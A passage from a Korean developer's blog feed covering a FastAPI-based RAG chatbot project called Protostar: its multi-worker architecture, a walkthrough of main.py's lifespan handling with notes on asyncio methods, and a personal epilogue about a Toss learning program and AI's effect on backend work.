<h2 id="-시스템-아키텍처-system-architecture">🏗 시스템 아키텍처 (System Architecture)</h2>

<p>본 프로젝트는 서비스의 안정성과 확장성을 위해 <strong>멀티 워커(Multi-Worker) 구조</strong>를 채택하고 있다.</p>

<p><img src="/assets/images/posts/2026-02/017.png" alt="" /></p>

<h3 id="-핵심-구성-요소-core-components">🛠 핵심 구성 요소 (Core Components)</h3>

<ol>
  <li><strong>채팅 워커 (Chat Worker)</strong>:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">chat:job:queue</code>를 구독(Consume)하여 실시간 대화를 처리한다.</li>
      <li>RAG를 통한 지식 검색 및 스트리밍 응답(Streaming Response)을 지원한다.</li>
      <li>해당 워커를 통해 사용자의 질문에 대한 답변을 생성하고, 이를 사용자에게 스트리밍으로 전달한다.</li>
    </ul>
  </li>
  <li><strong>지식 워커 (Knowledge Worker)</strong>:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">ai:job:queue</code>를 구독하여 문서 벡터화 작업을 수행한다.</li>
      <li>MinIO에서 파일을 가져와 텍스트 추출 -&gt; 청킹(Chunking) -&gt; 임베딩 -&gt; DB 저장을 담당한다.</li>
      <li>해당 워커를 통해 문서의 내용을 벡터화하여 저장하고, 이를 통해 RAG를 구현한다.</li>
    </ul>
  </li>
  <li><strong>요약 워커 (Summary Worker)</strong>:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">chat:summary:queue</code>를 구독하여 대화 내용을 배경에서 요약한다.</li>
      <li>다음 대화 시 컨텍스트(Context)를 효율적으로 관리할 수 있도록 돕는다.</li>
      <li>해당 워커를 통해 세션 당 기억력을 확보하고, 장기기 기억 시의 토큰 소비량을 약 73% 까지 압축하는 결과를 만들었다.</li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="-프로젝트-구조-project-structure">📂 프로젝트 구조 (Project Structure)</h2>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  app/
  ├── core/               # 핵심 비즈니스 로직
  │   ├── ai.py           # LLM 인터페이스 및 스트리밍 처리
  │   ├── worker.py       # 메인 채팅 워커 (Chat Worker)
  │   ├── worker_knowledge.py # RAG 전처리 워커 (Knowledge Worker)
  │   ├── worker_summary.py   # 대화 요약 워커 (Summary Worker)
  │   ├── rag_service.py  # 벡터 검색 및 RAG 로직
  │   ├── minio_client.py # MinIO 연동 클라이언트
  │   └── database.py     # SQLAlchemy &amp; DB 설정
  ├── prompts/            # 시스템 프롬프트 관리
  ├── main.py             # FastAPI 진입점 및 인스턴스 관리
  └── pyproject.toml      # 의존성 및 패키지 관리 (uv)
</code></pre></div></div>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Project" /><category term="Review" /><category term="FastAPI" /><summary type="html"><![CDATA[FastAPI 개념 정리 현대적, 성능이 뛰어난 웹 프레임워크 서버 RESTFul API 를 구축하는데 최적화, 3.14의 멀티코어 병렬 처리와 uv 같은 고속 툴 체인을 결합하여 백엔드 개발의 표준 방식으로 자리 잡게됨. 핵시 철학 및 특징 고성능: 웹엔진(Starlette), 데이터 검증(Pydantic) 빠른 개발 속도: 파이썬의 Type Hints를 활용해 코딩 시간을 획기적으로 줄임. 자동 문서화: 별도 작업 없이 Swagger UI 와 ReDoc을 통해 대화형 API 문서를 생성함. 데이터 검증 및 직렬화: JSON 데이터를 파이썬 객체로 자동 변환, 타입에러를 통한 안정성 확보]]></summary></entry><entry><title type="html">Protostar review note - 02 - FastAPI main.py</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/03-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 02 - FastAPI main.py" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/03-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/03-protostar-review.html"><![CDATA[<h2 id="mainpy">main.py</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">contextlib</span> <span class="kn">import</span> <span class="n">asynccontextmanager</span>
<span class="kn">from</span> <span class="n">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span>
<span class="kn">from</span> <span class="n">fastapi.responses</span> <span class="kn">import</span> <span class="n">StreamingResponse</span>
<span class="kn">from</span> <span class="n">core.redis</span> <span class="kn">import</span> <span class="n">init_test_redis</span>  
<span class="kn">from</span> <span class="n">core.database</span> <span class="kn">import</span> <span class="n">init_db</span>
<span class="kn">from</span> <span class="n">core.ai</span> <span class="kn">import</span> <span class="n">generate_response_stream</span>
<span class="c1"># from core.ai import init_ai_context
</span><span class="kn">from</span> <span class="n">core.worker</span> <span class="kn">import</span> <span class="n">run_worker</span>
<span class="kn">from</span> <span class="n">core.worker_summary</span> <span class="kn">import</span> <span class="n">run_summary_worker</span>
<span class="kn">from</span> <span class="n">core.silence_health_checker</span> <span class="kn">import</span> <span class="n">report_health_status_to_redis</span>
<span class="kn">from</span> <span class="n">core.redis</span> <span class="kn">import</span> <span class="n">get_redis_client</span>
<span class="kn">from</span> <span class="n">core.minio_client</span> <span class="kn">import</span> <span class="n">minio_client</span>
<span class="kn">from</span> <span class="n">core.config</span> <span class="kn">import</span> <span class="n">settings</span>
<span class="kn">from</span> <span class="n">core.worker_knowledge</span> <span class="kn">import</span> <span class="n">run_knowledge_worker</span> 

<span class="kn">import</span> <span class="n">asyncio</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">logging</span>

<span class="n">INSTANCE_ID</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">fastapi:</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())[</span><span class="si">:</span><span class="mi">8</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">'</span><span class="s">uvicorn</span><span class="sh">'</span><span class="p">)</span>
<span class="n">logger</span><span class="p">.</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">settings</span><span class="p">.</span><span class="n">LOG_LEVEL</span><span class="p">)</span>

<span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">uvicorn log level: </span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">LOG_LEVEL</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@asynccontextmanager</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">main_lifespan</span><span class="p">(</span><span class="n">app</span><span class="p">:</span> <span class="n">FastAPI</span><span class="p">):</span> <span class="c1"># context manager 패턴
</span>    <span class="c1"># 영역 1 - on module init
</span>    <span class="c1"># 시작 시 Redis 연결 테스트
</span>    <span class="k">await</span> <span class="nf">init_test_redis</span><span class="p">()</span>
    <span class="k">await</span> <span class="nf">init_db</span><span class="p">()</span>
    
    <span class="c1"># await init_ai_context()
</span>
    <span class="n">worker_task</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">create_task</span><span class="p">(</span><span class="nf">run_worker</span><span class="p">())</span>
    <span class="n">summary_task</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">create_task</span><span class="p">(</span><span class="nf">run_summary_worker</span><span class="p">())</span>
    <span class="n">health_task</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">create_task</span><span class="p">(</span><span class="nf">report_health_status_to_redis</span><span class="p">(</span><span class="n">INSTANCE_ID</span><span class="p">))</span>
    <span class="n">rag_task</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">create_task</span><span class="p">(</span><span class="nf">run_knowledge_worker</span><span class="p">())</span>
    <span class="k">await</span> <span class="n">minio_client</span><span class="p">.</span><span class="nf">check_connection</span><span class="p">()</span>
    
    <span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">🚀 Protostar FastAPI Instance </span><span class="si">{</span><span class="n">INSTANCE_ID</span><span class="si">}</span><span class="s"> Started &amp; Reporting Health...</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">yield</span> <span class="c1"># 기준점
</span>    <span class="c1"># 영역 2 - on module destroy 
</span>    <span class="n">worker_task</span><span class="p">.</span><span class="nf">cancel</span><span class="p">()</span>
    <span class="n">summary_task</span><span class="p">.</span><span class="nf">cancel</span><span class="p">()</span>
    <span class="n">health_task</span><span class="p">.</span><span class="nf">cancel</span><span class="p">()</span>
    <span class="n">rag_task</span><span class="p">.</span><span class="nf">cancel</span><span class="p">()</span>

    <span class="c1"># Graceful Shutdown - 종료 시 출석부에서 즉시 제거
</span>    <span class="c1"># 스코프 문제를 위하여 redis_client를 None으로 초기화
</span>    <span class="n">redis_client</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">redis_client</span> <span class="o">=</span> <span class="nf">get_redis_client</span><span class="p">()</span>
        <span class="k">await</span> <span class="n">redis_client</span><span class="p">.</span><span class="nf">zrem</span><span class="p">(</span><span class="sh">"</span><span class="s">cluster:heartbeats</span><span class="sh">"</span><span class="p">,</span> <span class="n">INSTANCE_ID</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> <span class="c1"># error handling 패스 안하기
</span>        <span class="n">logger</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Failed to remove instance from Redis during shutdown: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">redis_client</span><span class="p">:</span> <span class="c1"># 클라이언트 존재 할 때만 닫기
</span>            <span class="k">await</span> <span class="n">redis_client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="k">await</span> <span class="n">worker_task</span>
        <span class="k">await</span> <span class="n">health_task</span>
        <span class="k">await</span> <span class="n">summary_task</span>
        <span class="k">await</span> <span class="n">rag_task</span>
    <span class="k">except</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">CancelledError</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">FastAPI</span><span class="p">(</span><span class="n">lifespan</span><span class="o">=</span><span class="n">main_lifespan</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="개념-lifespan-state-management생명주기-상태-관리">개념: Lifespan State Management(생명주기 상태 관리)</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">asynccontextmanager</code> 데코레이터를 기반으로 <code class="language-plaintext highlighter-rouge">main_lifespan</code>을 정의하고, 이 함수를 기반으로 <code class="language-plaintext highlighter-rouge">yield</code>키워드 기준으로 전(setup), 후(teardown)를 하나의 함수에서 관리함.</li>
  <li>과거 버전 FastAPI(Starlette)에서는 <code class="language-plaintext highlighter-rouge">on_event("startup")</code>, <code class="language-plaintext highlighter-rouge">on_event("shutdown")</code> 등 핸들링을 분리하였으나, 이에 대한 복잡함을 개선한 구조.
    <h3 id="작동-원리">작동 원리</h3>
    <ol>
      <li>앱 시작시 <code class="language-plaintext highlighter-rouge">yield</code> 윗 부분 실행(DB 연결, 워커 생성 등)</li>
      <li><code class="language-plaintext highlighter-rouge">yield</code> 에서 대기하며, API 요청을 처리한다.</li>
      <li>앱 종료 시 시그널 수신이 됨과 함꼐 <code class="language-plaintext highlighter-rouge">yield</code> 하단 부분 실행(테스크 취소, 리소스 정리 등) 
할당과 해제가 한곳에서 명시적으로 관리되어서 에러 핸들링 등 전체 생명주기의 핸들링을 명확히 한다.</li>
    </ol>
  </li>
</ul>

<h3 id="현재-구조의-이점과-트레이드-오프">현재 구조의 이점과 트레이드 오프</h3>
<ul>
  <li>장점
    <ul>
      <li>배포가 매우 쉽다(컨테이너 하나에서 알아서 비동기 처리가 이루어짐)</li>
      <li>인프라 복잡도 낮으며, 코드 구현이 직관적</li>
    </ul>
  </li>
  <li>단점
    <ul>
      <li>리소스 경쟁: 만약 자체적인 무거운 AI 연산이 들어간다면(RAGGING, Summary 등이 로컬로 구동 시), 이 작업들이 CPU 를 점유하면서 API 응답 속도가 같이 느려질 수 있다.</li>
      <li>안정성: 비동기 구조일 뿐이기에 워커가 에러가 나면서 프로세스가 죽으면 API 서버 역시 죽을 수 있다.</li>
      <li>확장성: 트래픽이 늘어 API 서버로서 스케일아웃 하면, 워커도 늘어난다고 보면 됨.</li>
      <li><strong>그러나 결론적으로 로컬 LLM 서빙과 같은 경우가 되어 CPU 연산이 늘어나면 모를까, 현재의 아키텍처는 외부 API로 실질 역할을 하기 때문에 Risk 가 될 순 없다.</strong></li>
      <li>단! 주의사항은, 문서 파싱 영역으로, 자료의 제약이나 이런게 없다면 자원의 사용량이 기하적으로 늘수 있음. 따라서 이를 위해선
        <ol>
          <li>파일과 파싱의 제약을 두는 것</li>
          <li><code class="language-plaintext highlighter-rouge">asyncio.to_thread()</code> 로 감싸서 별도 스레드로 분리 하는 것이 필요시 될 수 있다.</li>
        </ol>
      </li>
    </ul>
  </li>
</ul>

<h3 id="asyncio-주요-메서드들">asyncio 주요 메서드들</h3>
<p><code class="language-plaintext highlighter-rouge">main.py</code>에서 사용된 <code class="language-plaintext highlighter-rouge">asyncio.create_task</code>는 “백그라운드 실행(Fire and Forget)”을 위한 가장 기초적인 도구다.</p>

<p>하지만 실무(Production) 레벨의 <strong>견고한 비동기 시스템</strong>을 위해서는 다음 4가지 핵심 메서드를 반드시 알아야 한다. 이들은 “제어(Control)”와 “안정성(Safety)”을 담당한다.</p>

<hr />

<h4 id="1-asynciogatheraws-return_exceptionsfalse">1. <code class="language-plaintext highlighter-rouge">asyncio.gather(*aws, return_exceptions=False)</code></h4>

<h5 id="1-개념-concept">1. 개념 (Concept)</h5>

<ul>
  <li><strong>“동시성 집합 실행 및 결과 취합”</strong></li>
  <li>여러 개의 비동기 함수(Coroutine)를 동시에 실행시키고, <strong>모든 결과가 다 나올 때까지 기다렸다가(Await)</strong> 리스트 형태로 한 번에 반환한다.</li>
</ul>

<h5 id="2-대안-및-차이-alternatives">2. 대안 및 차이 (Alternatives)</h5>
<ul>
  <li><strong>vs <code class="language-plaintext highlighter-rouge">create_task</code> loop:</strong> <code class="language-plaintext highlighter-rouge">create_task</code>를 for문으로 돌리고 나중에 <code class="language-plaintext highlighter-rouge">await</code>하는 것보다 코드가 훨씬 간결한 구조 가능.</li>
  <li><strong>vs <code class="language-plaintext highlighter-rouge">asyncio.TaskGroup</code> (Python 3.11+):</strong> 최신 버전에서는 <code class="language-plaintext highlighter-rouge">TaskGroup</code>이 <code class="language-plaintext highlighter-rouge">gather</code>보다 권장됨. (예외 처리가 더 안전함)</li>
</ul>

<h5 id="3-트레이드오프-trade-offs">3. 트레이드오프 (Trade-offs)</h5>
<ul>
  <li><strong>장점:</strong> 여러 API 호출(예: LLM 요청 3개 동시 발송)을 병렬로 처리하여 전체 대기 시간을 획기적으로 줄이기 가능</li>
  <li><strong>단점:</strong> <code class="language-plaintext highlighter-rouge">return_exceptions=False</code>(기본값)일 경우, <strong>하나만 에러가 나도 전체가 즉시 터짐.</strong> 나머지 성공한 작업의 결과도 잃을 수 있다. 또한 효과적이게 보이지만, 너무 과하게 동시 실행하면 시스템 전체 문제 생김. 이럴 때 <code class="language-plaintext highlighter-rouge">Semaphore</code> 활용하면 효과적.</li>
</ul>

<h5 id="4-취약점-및-개선-vulnerabilities">4. 취약점 및 개선 (Vulnerabilities)</h5>
<ul>
  <li><strong>취약점:</strong> 외부 API(OpenRouter 등) 호출 시 하나가 실패했다고 전체 프로세스가 중단되면 곤란할 수 있음.</li>
  <li><strong>개선:</strong> <code class="language-plaintext highlighter-rouge">return_exceptions=True</code> 옵션을 켜서, 에러가 발생하더라도 성공한 결과는 건지도록 하는 방법도 가능.</li>
</ul>

<hr />

<h4 id="2-asynciowait_foraw-timeout">2. <code class="language-plaintext highlighter-rouge">asyncio.wait_for(aw, timeout)</code></h4>

<h5 id="1-개념-concept-1">1. 개념 (Concept)</h5>

<ul>
  <li><strong>“시간 제한(Timeout) 걸기”</strong></li>
  <li>특정 비동기 작업이 지정된 시간(<code class="language-plaintext highlighter-rouge">timeout</code> 초) 내에 끝나지 않으면 <strong>강제로 취소(<code class="language-plaintext highlighter-rouge">CancelledError</code>)</strong> 시키고 에러를 발생시킴.</li>
</ul>

<h5 id="2-대안-및-차이-alternatives-1">2. 대안 및 차이 (Alternatives)</h5>
<ul>
  <li><strong>vs <code class="language-plaintext highlighter-rouge">requests</code>의 timeout:</strong> 라이브러리 자체(timeout 파라미터) 기능은 동기 방식인 경우가 많으나, <code class="language-plaintext highlighter-rouge">wait_for</code>는 언어 차원에서 비동기 작업의 실행 시간을 강제로 끊어버린다.</li>
</ul>

<h5 id="3-트레이드오프-trade-offs-1">3. 트레이드오프 (Trade-offs)</h5>
<ul>
  <li><strong>장점:</strong> 무한 대기(Hang) 상태를 방지하여 시스템 리소스를 보호하는 역할을 함. (예: OpenRouter 에서 답변 토큰의 전달에서 응답이 없을 때 30초 뒤에 끊어버림)</li>
  <li><strong>단점:</strong> 타임아웃 발생 시 작업이 <strong>즉시 취소</strong>되므로, DB 트랜잭션 도중이라면 데이터 무결성이 깨질 수 있다.</li>
</ul>

<h5 id="4-취약점-및-개선-vulnerabilities-1">4. 취약점 및 개선 (Vulnerabilities)</h5>
<ul>
  <li><strong>취약점:</strong> <code class="language-plaintext highlighter-rouge">main.py</code>의 <code class="language-plaintext highlighter-rouge">test-ai</code> 같은 엔드포인트에 타임아웃이 없으면, LLM이 멈췄을 때 클라이언트도 영원히 기다리게 될수 있다는 점을 개선해준다.</li>
  <li><strong>개선:</strong> 외부 통신 로직에는 반드시 <code class="language-plaintext highlighter-rouge">wait_for</code>를 씌우는 것이 원칙이다.</li>
</ul>

<hr />

<h4 id="3-asyncioto_threadfunc--args-kwargs">3. <code class="language-plaintext highlighter-rouge">asyncio.to_thread(func, /, *args, **kwargs)</code></h4>

<h5 id="1-개념-concept-2">1. 개념 (Concept)</h5>

<ul>
  <li><strong>“블로킹 함수 격리 실행”</strong></li>
  <li>동기(Sync) 방식의 무거운 함수(파일 I/O, PDF 파싱, 암호화 연산)를 <strong>별도의 스레드</strong>로 보내서, 메인 루프(Event Loop)가 멈추지 않게 한다.</li>
</ul>

<h5 id="2-대안-및-차이-alternatives-2">2. 대안 및 차이 (Alternatives)</h5>
<ul>
  <li><strong>vs <code class="language-plaintext highlighter-rouge">run_in_executor</code>:</strong> 과거(Python 3.9 미만)에 쓰던 방식. <code class="language-plaintext highlighter-rouge">to_thread</code>가 훨씬 사용하기 쉽고 직관적(kwargs 지원 등)이므로 굳이 쓸 이유는 없다.</li>
</ul>

<h5 id="3-트레이드오프-trade-offs-2">3. 트레이드오프 (Trade-offs)</h5>
<ul>
  <li><strong>장점:</strong> <code class="language-plaintext highlighter-rouge">async</code> 코드를 전면 수정하지 않고도 기존 동기 라이브러리(<code class="language-plaintext highlighter-rouge">pypdf</code>, <code class="language-plaintext highlighter-rouge">pandas</code> 등)를 비동기 환경에서 안전하게 쓸 수 있다.</li>
  <li><strong>단점:</strong> 스레드 생성 비용(오버헤드)이 발생하므로, 너무 가벼운 작업(단순 덧셈 등)에 쓰면 오히려 느려질 수 있음.</li>
</ul>

<hr />

<h4 id="4-asyncioshieldaw">4. <code class="language-plaintext highlighter-rouge">asyncio.shield(aw)</code></h4>

<h5 id="1-개념-concept-3">1. 개념 (Concept)</h5>
<ul>
  <li><strong>“취소 방지 방패”</strong></li>
  <li>사용자가 API 요청을 취소하거나 브라우저를 닫아도, <strong>“이 작업만큼은 절대 중단되지 말고 끝까지 실행하라”</strong>고 보호하는 기능이다.</li>
</ul>

<h5 id="2-대안-및-차이-alternatives-3">2. 대안 및 차이 (Alternatives)</h5>
<ul>
  <li><strong>vs <code class="language-plaintext highlighter-rouge">BackgroundTasks</code> (FastAPI):</strong> FastAPI의 <code class="language-plaintext highlighter-rouge">BackgroundTasks</code>는 응답을 보낸 <em>후</em>에 실행되지만, <code class="language-plaintext highlighter-rouge">shield</code>는 응답 <em>중</em>에 실행되면서도 취소만 막아준다.</li>
</ul>

<h5 id="3-트레이드오프-trade-offs-3">3. 트레이드오프 (Trade-offs)</h5>
<ul>
  <li><strong>장점:</strong> 결제 처리, DB 저장, 로그 기록 등 <strong>중단되면 데이터 꼬임이 발생하는 작업</strong>에 필수로 해놓을 수 있다.</li>
  <li><strong>단점:</strong> 남용하면 좀비 프로세스(끝나지 않는 작업)가 서버 리소스를 점유할 수 있다.</li>
</ul>

<h5 id="4-취약점-및-개선-vulnerabilities-2">4. 취약점 및 개선 (Vulnerabilities)</h5>
<ul>
  <li><strong>개선 포인트:</strong> <code class="language-plaintext highlighter-rouge">main.py</code>의 <code class="language-plaintext highlighter-rouge">main_lifespan</code> 종료 시점 외에도, 중요한 DB 기록 로직은 <code class="language-plaintext highlighter-rouge">asyncio.shield()</code>로 감싸는 것을 고려해야 한다.</li>
</ul>

<hr />

<h4 id="요약-protostar-프로젝트-적용-제안">[요약] Protostar 프로젝트 적용 제안</h4>

<table>
  <thead>
    <tr>
      <th>메서드</th>
      <th>적용 포인트</th>
      <th>한 줄 코드 예시</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>**gather**</td>
      <td>여러 문서를 동시에 요약할 때</td>
      <td><code class="language-plaintext highlighter-rouge">await asyncio.gather(doc1_task, doc2_task)</code></td>
    </tr>
    <tr>
      <td>**wait_for**</td>
      <td>LLM API 호출 시 무한 대기 방지</td>
      <td><code class="language-plaintext highlighter-rouge">await asyncio.wait_for(llm_call(), timeout=30)</code></td>
    </tr>
    <tr>
      <td>**to_thread**</td>
      <td>**PDF 파싱 등 CPU 작업 격리 (최우선)**</td>
      <td><code class="language-plaintext highlighter-rouge">await asyncio.to_thread(parse_pdf, file)</code></td>
    </tr>
    <tr>
      <td>**shield**</td>
      <td>핵심 데이터 DB 저장 보호</td>
      <td><code class="language-plaintext highlighter-rouge">await asyncio.shield(save_to_db_task)</code></td>
    </tr>
  </tbody>
</table>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Project" /><category term="Review" /><category term="FastAPI" /><summary type="html"><![CDATA[main.py]]></summary></entry><entry><title type="html">토스 러너스 하이 2기 에필로그</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner's-high-copy.html" rel="alternate" type="text/html" title="토스 러너스 하이 2기 에필로그" /><published>2026-02-03T00:00:00+00:00</published><updated>2026-02-03T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner&apos;s-high%20copy</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner&apos;s-high-copy.html"><![CDATA[<h2 id="learners-high-2nd-epilogue">Learner’s High 2nd Epilogue</h2>

<p><img src="/assets/images/posts/2025-12/20251217-021.png" alt="" /></p>

<h3 id="runners-high">Runner’s High</h3>
<p>한창 다이어트를 할 때 일이다. 살을 격하게 빼던 시기, 달리기로 어떻게든 20kg 을 빼려고 발악했다.</p>

<p>뛰기 시작한지 10분, 20분,</p>

<p>시간이 흐를 수록 발목, 무릎이 삐걱거리게 되고, 발 바닥부터 오는 통증은 바늘 위를 뛰고 있는 듯 느껴진다. 그때는 세상 그렇게 달리기 싫었다. 아프다는 것, 그리고 그 통증이 앞으로 계속될 거라는 두려움은 항상 적응되지 않는다.</p>

<p>그런데 신기하게도 30분, 기분은 상쾌해지고, 아프던 통증이 서서히 바닥부터 사라져감을 느낀다. 통-통- 발 바닥이 지면과 떨어질 때, 박자감을 즐길 수 있게되고,  찾아오는 가벼움은 어느새 10분을, 또 어느새 10분을 지나게 만든다. 이것이 러너스 하이(Runner’s high) 라는 달리기를 하면서 느끼게 되는, 정말 신기한 호르몬 세상의 부산물이다.</p>

<p>그리고 토스는 이 이름을 교묘하게 비틀었다. Learner’s High. 그들은 ‘지식습득’, ‘임팩트’ 만이 아니라, 문제를 바라보며 끝까지 달릴 사람, 부딪힐 사람, 힘든 일을 사서 할 사람을 찾아 다녔고, 나는 정말 운 좋게도, 이 반열에 들어갈 수 있게 되었다.</p>

<p>그렇기에 나는 단순히 기능을 구현(CRUD)을 하는것에서 넘어서 SRE 관점의 유량 제어(Traffic Dam) 기능의 설계와 구현, AI의 할루시네이션을 억제하기 위한 RAG 파이프라인, 시스템 생존을 위한 관측성 도구들 일체를 구축해보았다. 하나 같이 힘들고, 숨은 찼다. 하지만 어느새 ‘상쾌함’과 함께 해결해 나간다. 스케일 아웃을 위한 내 나름의 수치 통계를 내 보고 VU 1000에 대한 에러율 0% 구현, AI의 세션 기억력, 실시간 RAG 파이프라인 구축, 토큰 압축률 73% 구현 등을 마주했다.</p>

<p>앞으로의 내용은 Learner’s high. 그리고 이것이 그 한달의 여정의 에필로그다. 해당 코스에 대한 토스 측의 디테일한 기준이나 정보는 공개 불가다. 다행이 내가 달려간 것들에 대해선 이야기 할 수 있다.그러니 <code class="language-plaintext highlighter-rouge">Backend</code>, <code class="language-plaintext highlighter-rouge">AI</code>, <code class="language-plaintext highlighter-rouge">Frontend</code>, <code class="language-plaintext highlighter-rouge">DevOps</code>, 풀 사이클로 진행했던 프로젝트의 한달의 여정을 하나씩 정리하려고 한다. 그 다음 또다른 <code class="language-plaintext highlighter-rouge">Next Step</code> 을 그려볼까 한다.</p>

<p><img src="/assets/images/posts/2026-02/001.png" alt="" /></p>
<blockquote>
  <p>Protostar 챗봇</p>
</blockquote>

<h3 id="what-i-built">What I Built</h3>
<h4 id="ai-devops--현대-백엔드-아키텍처의-필수-요소">AI, DevOps:  현대 백엔드 아키텍처의 필수 요소</h4>
<p>이전 회사에서의 업무를 종료하고, 이직을 준비하기 위하여 방향성을 잡으면서 가장 먼저 생각했던건 두가지다. 하나는 ‘과연 나는 증명된 개발자인가?’ 라는 질문이며, 또 하나는 ‘다음의 시대에 백엔드 개발자들에게 요구될, AI 와 함께 일할 사람들의 자질에는 무엇이 필요할까?’ 라는 질문이다. AI 는 분명 거품도 있다. 그럼에도 임팩트가 있는 것도 사실이기에, 이 두 질문의 답을 내 스스로 내리는 것, 그것이 내가 ‘인재’임을 증명하는 길이라고 생각했다.</p>

<p>그래서 며칠에 걸쳐 온갖 회사들의 공고를 분석하고, 회사 생활을 통해 얻은 인사이트를 한껏 버무렸을 때 얻은 것들은 다음과 같았다.</p>

<ol>
  <li><strong>AI 는 개발 코스트를 엄청나게 낮추었다. 코드의 단가는 사실상 0이다. ‘코드’를 전문성의 가치 기준으로 삼는 것은 부족한 판단이다.</strong></li>
  <li><strong>AI를 통해 도전의 허들이 매우 낮아졌다. 배우기 어렵다, 시간이 없다는 말은 변명이다.</strong></li>
  <li><strong>즉, 회사는 그만큼의 인력을 줄이거나, 동일 인력으로도 더욱 큰 임팩트를 만들고자 할 것이다. 이때 방향성은 AI 를 ‘통해’ 얻으려고 하거나, AI를 ‘기반’으로 얻으려고 할 것이다.</strong></li>
</ol>

<p>우선 AI-Assisted Development(소위 ‘바이브 코딩)은 이미 너무나 명확하다. 요구사항, PRD의 구현 수준만 명확하다면, 코드를 ‘내가 만들 필요’는 없고, 이는 1번을 명료하게 만든다. 특히나 이번 프로젝트에서는 방대한 지식을 필요로 하던 프론트엔드의 구성을, 오로지 AI 구현, 구조만 스스로 파악하는 것으로 해결했다. 이러한 점은 코드의 가치가 얼마나 낮아졌는가에 답을 제공한다. 또한 이러한 점에서 2번 역시 명확하게 연결된다.</p>

<p>그러나 결론적으로 중요한건 마지막 문장이다. <code class="language-plaintext highlighter-rouge">기반</code>이라는 단어는 AI 를 ‘생산 과정’에서 도입했을 때 생길 <code class="language-plaintext highlighter-rouge">생산성의 증대</code>를 의미하며, <code class="language-plaintext highlighter-rouge">통해</code>라는 것은 AI를 도구로 서비스에 적용할 때 생길 <code class="language-plaintext highlighter-rouge">비즈니스 임팩트</code>에 대한 부분이다. AI 의 발전은 진짜이고, 이 발전에서 비롯한 기업과 서비스의 성장, 발전의 욕구는 과연 무엇을 불러올까?</p>

<p>다양한 입장에 따른 해석은 될 것이다. 그러나 필연적으로 <strong>AI는 시스템의 비대화, 리소스의 제약에서 오는 하드웨어 이슈를 어떻게 해결할 것인가?</strong> 라는 질문이 무조건 함께할 것이다- 라고 생각하다. 왜냐하면 AI 는 검색 증강이 필요하고, 여러 프레임워크들의 연동은 당연히 필요하며, 자연어는 필연적으로 처리 로직의 복잡도를 올리며, 입출력하는데 엄청난 리소스, 비용을 쓴다. 하물며 LLM 은 ‘100%’를 보장하지 않아, 그 답변의 튜닝에 세심한 주의가 필요하다.</p>

